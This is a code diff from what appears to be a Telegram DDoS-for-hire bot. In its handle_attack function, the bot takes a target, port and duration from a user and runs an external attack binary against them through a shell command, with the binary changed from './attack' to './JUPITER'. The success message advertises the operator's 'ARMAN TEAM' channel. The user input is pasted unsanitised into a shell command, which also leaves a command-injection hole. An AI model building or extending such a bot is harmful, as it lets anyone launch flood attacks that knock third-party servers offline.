@@ -479,7 +479,7 @@ def handle_attack(message):
                 record_command_logs(user_id, target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)
-                full_command = f"./attack {target} {port} {time} 300"
+                full_command = f"./JUPITER {target} {port} {time}"
                 subprocess.run(full_command, shell=True)
                 response = f"💠 𝘼𝙏𝙏𝘼𝘾𝙆 𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿 💠\n\n👩‍💻𝙏𝘼𝙍𝙂𝙀𝙏  :- {target}💣 𝙋𝙊𝙍𝙏:- {port}\n📟 𝙏𝙄𝙈𝙀 :- {time}\n⚔️ 𝙈𝙀𝙏𝙃𝙊𝘿 :- 𝘼𝙍𝙈𝘼𝙉 𝙏𝙀𝘼𝙈 𝘼𝙏𝙏𝘼𝘾𝙆𝙀𝙍 𝙉𝘼𝙈𝙀 :- {username}\n\n𝐉𝐎𝐈𝐍 𝐍𝐎𝐖 :- @ARMANTEAMVIP\n𝙊𝙒𝙉𝙀𝙍 :- @MR_ARMAN_OWNER"
         else:
